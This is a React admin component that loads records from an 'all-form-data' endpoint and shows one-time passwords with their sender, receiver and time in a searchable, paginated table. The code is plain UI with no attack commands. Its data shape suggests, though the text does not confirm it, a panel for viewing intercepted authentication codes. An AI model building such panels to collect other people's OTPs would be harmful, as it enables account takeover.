import React, { useEffect, useState } from "react";
import axios from "axios";

const ITEMS_PER_PAGE = 10;

const OtpTable = () => {
  const [otpData, setOtpData] = useState([]);
  const [filteredData, setFilteredData] = useState([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [loading, setLoading] = useState(true);

useEffect(() => {
  const fetchOtpData = async () => {
    setLoading(true);
    try {
      const adminToken = localStorage.getItem("admin-token");
      const { data } = await axios.get(
        `${process.env.REACT_APP_API_URL}/api/admin/all-form-data`,
        {
          headers: {
            Authorization: `${adminToken}`,
          },
        }
      );

      let list = data?.data || data || [];

      // 🔥 Sort latest first
      list = list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

      setOtpData(list);
      setFilteredData(list);
    } catch (err) {
      setOtpData([]);
      setFilteredData([]);
    } finally {
      setLoading(false);
    }
  };
  fetchOtpData();
}, []);


  // Filter data on search input
  useEffect(() => {
    const term = searchTerm.toLowerCase().trim();
    if (!term) {
      setFilteredData(otpData);
      setCurrentPage(1);
      return;
    }
    const filtered = otpData.filter(
      (row) =>
        (row.otp && row.otp.toLowerCase().includes(term)) ||
        (row.time && row.time.toLowerCase().includes(term)) ||
        (row.sender && row.sender.toLowerCase().includes(term)) ||
        (row.reciever && row.reciever.toLowerCase().includes(term))
    );
    setFilteredData(filtered);
    setCurrentPage(1);
  }, [searchTerm, otpData]);

  const totalPages = Math.ceil(filteredData.length / ITEMS_PER_PAGE);
  const startIndex = (currentPage - 1) * ITEMS_PER_PAGE;
  const currentRows = filteredData.slice(startIndex, startIndex + ITEMS_PER_PAGE);

  return (
    <div className="px-4 py-4 sm:px-6 sm:py-6 max-w-4xl mx-auto">
      <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 sm:mb-6">
        OTP Data
      </h2>

      {/* Search */}
      <div className="mb-4 sm:mb-6">
        <input
          type="text"
          placeholder="Search by OTP, sender, receiver, time..."
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          className="w-full max-w-md p-2 sm:p-3 text-sm sm:text-base border rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </div>

      {/* Table */}
      <div className="overflow-x-auto bg-white shadow-md rounded-md text-sm sm:text-base">
        {loading ? (
          <div className="p-8 text-center text-gray-500">Loading...</div>
        ) : (
          <table className="min-w-full table-auto">
            <thead className="bg-gray-100 text-gray-700">
              <tr>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">OTP</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Time</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Sender</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Receiver</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3 hidden md:table-cell">ID</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3 hidden md:table-cell">Created At</th>
              </tr>
            </thead>
            <tbody>
              {currentRows.length > 0 ? (
                currentRows.map((row) => (
                  <tr key={row._id || row.id} className="border-t">
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.otp || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.time || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.sender || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.reciever || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4 text-gray-600 hidden md:table-cell">
                      {row._id || row.id || ""}
                    </td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4 text-gray-600 hidden md:table-cell">
                      {row.createdAt ? new Date(row.createdAt).toLocaleString() : ""}
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan="6" className="text-center px-4 py-8 sm:px-6 sm:py-10 text-gray-500">
                    No data found.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        )}
      </div>

      {/* Pagination */}
      <div className="mt-4 sm:mt-6 flex flex-wrap items-center justify-center gap-3 sm:gap-4">
        <button
          className="px-3 py-1 sm:px-4 sm:py-2 bg-gray-200 text-xs sm:text-sm rounded hover:bg-gray-300 disabled:opacity-50"
          onClick={() => setCurrentPage((prev) => prev - 1)}
          disabled={currentPage === 1}
        >
          Previous
        </button>
        <span className="text-xs sm:text-sm text-gray-700">
          Page {currentPage} of {totalPages}
        </span>
        <button
          className="px-3 py-1 sm:px-4 sm:py-2 bg-gray-200 text-xs sm:text-sm rounded hover:bg-gray-300 disabled:opacity-50"
          onClick={() => setCurrentPage((prev) => prev + 1)}
          disabled={currentPage === totalPages || totalPages === 0}
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default OtpTable;
